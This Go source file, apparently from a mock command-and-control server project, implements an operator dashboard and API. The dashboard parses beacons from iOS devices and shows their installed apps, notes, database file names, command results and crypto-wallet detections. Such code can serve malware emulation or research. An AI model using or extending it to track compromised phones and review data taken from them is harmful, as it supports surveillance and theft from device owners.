package server

import (
	"encoding/json"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"

	"mockc2/internal/config"
	"mockc2/internal/store"
)

// 单页实验看板：/__dash (HTML) + /__dash/api (聚合 JSON)。

var dashSafeRe = regexp.MustCompile(`^[A-Za-z0-9_.-]+$`)

func parsePacket(folder, body string) map[string]any {
	var v any
	if json.Unmarshal([]byte(body), &v) != nil {
		if strings.HasPrefix(body, "<binary") {
			return map[string]any{"kind": "binary", "hint": clip96(body)}
		}
		return map[string]any{"kind": "text", "hint": clip96(body)}
	}
	o, ok := v.(map[string]any)
	if !ok {
		return map[string]any{"kind": "list-json", "hint": clip96(body)}
	}
	k := map[string]any{"kind": folder}
	switch folder {
	case "beacon":
		di, _ := o["device_info"].(map[string]any)
		k["uuid"] = o["uuid"]
		k["machine"] = di["machine"]
		k["ios"] = di["ios_version"]
		k["build"] = di["build_version"]
		k["status"] = o["status"]
	case "sync":
		k["deviceVersion"] = o["deviceVersion"]
		k["domain"] = o["domain"]
	case "u":
		apps := asSlice(o["apps"])
		k["lhu"] = o["lhu"]
		k["app_count"] = len(apps)
		sample := []any{}
		for i, a := range apps {
			if i >= 4 {
				break
			}
			if m, ok := a.(map[string]any); ok {
				sample = append(sample, m["name"])
			}
		}
		k["apps_sample"] = sample
	case "nb":
		notes := asSlice(o["list"])
		k["lhu"] = o["lhu"]
		k["note_count"] = len(notes)
		sample := []any{}
		for i, n := range notes {
			if i >= 3 {
				break
			}
			if m, ok := n.(map[string]any); ok {
				sample = append(sample, m["title"])
			}
		}
		k["notes_sample"] = sample
		df := []any{}
		for _, f := range asSlice(o["db_files"]) {
			if m, ok := f.(map[string]any); ok {
				df = append(df, m["name"])
			}
		}
		k["db_files"] = df
	case "result":
		k["command_id"] = o["command_id"]
		k["status"] = o["status"]
	case "heartbeat":
		k["signal"] = strings.TrimSpace(body)
	case "war":
		k["probe"] = o["probe"]
	default:
		raw := map[string]any{}
		i := 0
		for key, val := range o {
			if i >= 6 {
				break
			}
			raw[key] = val
			i++
		}
		k["raw"] = raw
	}
	return k
}

func clip96(s string) string {
	if len(s) > 96 {
		return s[:96]
	}
	return s
}

// tailJSONL 读取 JSONL 末尾 n 行（老 -> 新）。改用 seek 尾部读块，
// 不再整读大文件（access.jsonl 长期增长后整读会拖慢 /__dash/api）。
func tailJSONL(name string, n int) []map[string]any {
	path := filepath.Join(config.Get().CaptureRoot, name)
	f, err := os.Open(path)
	if err != nil {
		return []map[string]any{}
	}
	defer f.Close()

	// 尾部读块：审计行约 200B，n 行留足余量；块大小上限避免读入超大文件。
	const block = 512 * 1024
	info, err := f.Stat()
	if err != nil {
		return []map[string]any{}
	}
	size := info.Size()
	off := size - block
	if off < 0 {
		off = 0
	}
	buf := make([]byte, size-off)
	if _, err := f.ReadAt(buf, off); err != nil && err != io.EOF {
		return []map[string]any{}
	}

	lines := strings.Split(strings.ReplaceAll(string(buf), "\r\n", "\n"), "\n")
	var kept []string
	skipFirst := off > 0 // off>0 时首行是从文件中间截断的半行
	for i := len(lines) - 1; i >= 0 && len(kept) < n; i-- {
		if skipFirst && i == 0 {
			continue
		}
		if strings.TrimSpace(lines[i]) != "" {
			kept = append(kept, lines[i])
		}
	}
	// 老 -> 新
	out := []map[string]any{}
	for i := len(kept) - 1; i >= 0; i-- {
		var m map[string]any
		if json.Unmarshal([]byte(kept[i]), &m) == nil {
			out = append(out, m)
		}
	}
	return out
}

func registerDash(rt *Router) {
	rt.GET("/__dash/file", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		ep := r.URL.Query().Get("ep")
		name := r.URL.Query().Get("name")
		if !dashSafeRe.MatchString(ep) || !dashSafeRe.MatchString(name) {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad params"})
			return
		}
		root := config.Get().CaptureRoot
		path := filepath.Join(root, ep, name)
		rel, err := filepath.Rel(root, path)
		if err != nil || strings.HasPrefix(rel, "..") {
			writeJSON(w, http.StatusForbidden, map[string]any{"error": "forbidden"})
			return
		}
		if !isFile(path) {
			writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
			return
		}
		serveFile(w, path, "", "no-store")
	})

	rt.GET("/__dash/api", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		logTail := queryInt(r, "log_tail", 150)
		accTail := queryInt(r, "acc_tail", 80)
		st := store.GetStore()
		capRoot := config.Get().CaptureRoot

		// 设备列表：以 /a + /beacon 收包解析为准（packet_meta field∈{uuid,lhu}，
		// endpoint∈{a,beacon} —— store.ListDevices 的口径）。一台设备 = 一个 uuid 一行，
		// 而不是前端访客台账（devices 表含所有过路浏览器，会混入非托管流量）。
		// IP 由 devices 台账就近匹配（±30min）推断；进度/阶段沿用阶段权重表。
		// DevicesView 过滤列兼容字段依旧带上（deviceVersion/domain/host/channelCode/ua）：
		// deviceVersion ← a/beacon 的 ios_version；host ← a 包 hostname（设备名）。
		devices := []map[string]any{}
		for _, d := range store.ListDevices() {
			ver := store.ToStr(d["ios"])
			if ver != "" {
				ver = "IOS " + ver
			} else if m := store.ToStr(d["machine"]); m != "" {
				ver = m
			} else {
				ver = "unknown"
			}
			devices = append(devices, map[string]any{
				"ts":            store.ToStr(d["last_seen"]),
				"first_seen":    store.ToStr(d["first_seen"]),
				"ip":            store.ToStr(d["ip"]),
				"uuid":          store.ToStr(d["uuid"]),
				"device_name":   store.ToStr(d["deviceName"]),
				"machine":       store.ToStr(d["machine"]),
				"ios":           store.ToStr(d["ios"]),
				"build":         store.ToStr(d["build"]),
				"online":        d["online"] == true,
				"deviceVersion": ver,
				"domain":        "",
				"host":          store.ToStr(d["deviceName"]),
				"ua":            "",
				"channelCode":   "",
				"progress":      d["progress"],
				"stage":         d["stage"],
				"apps_count":    d["apps_count"],
				"war_count":     d["war_count"],
				"notes_count":   d["notes_count"],
				"wallets":       d["wallets"],
			})
		}

		// 各端点最近留存（环形内存缓冲，动态覆盖所有捕获文件夹）
		endpoints := map[string]any{}
		counts := map[string]any{}
		for _, folder := range st.Folders() {
			items := st.Recent(folder)
			if len(items) == 0 {
				// 冷启动兜底：内存环形空时，回读该端点磁盘最近 12 个留存包
				dir := filepath.Join(capRoot, folder)
				entries, err := os.ReadDir(dir)
				var files []os.DirEntry
				if err == nil {
					for _, e := range entries {
						if !e.IsDir() {
							files = append(files, e)
						}
					}
					sort.Slice(files, func(i, j int) bool { return files[i].Name() < files[j].Name() })
					if len(files) > 12 {
						files = files[len(files)-12:]
					}
				}
				for i := len(files) - 1; i >= 0; i-- {
					b, err := os.ReadFile(filepath.Join(dir, files[i].Name()))
					if err != nil {
						continue
					}
					items = append(items, map[string]any{
						"ts": "-", "file": files[i].Name(), "size": len(b),
						"body": store.ToStr(string(b)),
					})
				}
			}
			parsed := make([]map[string]any, 0, len(items))
			for _, it := range items {
				body := store.ToStr(it["body"])
				if len(body) > 1500 {
					body = body[:1500] + "…（truncated " + store.ToStr(it["size"]) + "B，完整内容走 /__dash/file）"
				}
				m := map[string]any{}
				for k, v := range it {
					m[k] = v
				}
				m["body"] = body
				m["parsed"] = parsePacket(folder, store.ToStr(it["body"]))
				parsed = append(parsed, m)
			}
			endpoints[folder] = parsed
			if entries, err := os.ReadDir(filepath.Join(capRoot, folder)); err == nil {
				counts[folder] = len(entries)
			} else {
				counts[folder] = 0
			}
		}

		peRolls := store.PeEventsRecent(20)

		walletsPanel := []map[string]any{}
		for _, row := range store.Summary("", 20) {
			rn := store.ToStr(row["rule_name"])
			walletsPanel = append(walletsPanel, map[string]any{"rule": rn,
				"display": store.Display(rn), "count": row["count"], "last_ts": row["last_ts"]})
		}

		writeJSON(w, http.StatusOK, map[string]any{
			"ts":        nowString(),
			"devices":   devices,
			"pe_events": peRolls,
			"wallets":   walletsPanel,
			"log":       tailJSONL("console.jsonl", logTail),
			"access":    tailJSONL("access.jsonl", accTail),
			"endpoints": endpoints,
			"counts":    counts,
		})
	})

	rt.GET("/__dash/index.html", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		serveFile(w, filepath.Join(config.Get().DashboardDir, "index.html"), "text/html", "no-store")
	})

	rt.GET("/__dash/assets/{fname}", func(w http.ResponseWriter, r *http.Request, p map[string]string) {
		fname := p["fname"]
		if !dashSafeRe.MatchString(fname) {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad name"})
			return
		}
		path := filepath.Join(config.Get().DashboardDir, "assets", fname)
		if !isFile(path) {
			writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
			return
		}
		mt := "application/javascript"
		if strings.HasSuffix(fname, ".css") {
			mt = "text/css"
		}
		serveFile(w, path, mt, "no-store")
	})

	rt.GET("/__dash", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		serveFile(w, filepath.Join(config.Get().DashboardDir, "index.html"), "text/html", "no-store")
	})
}
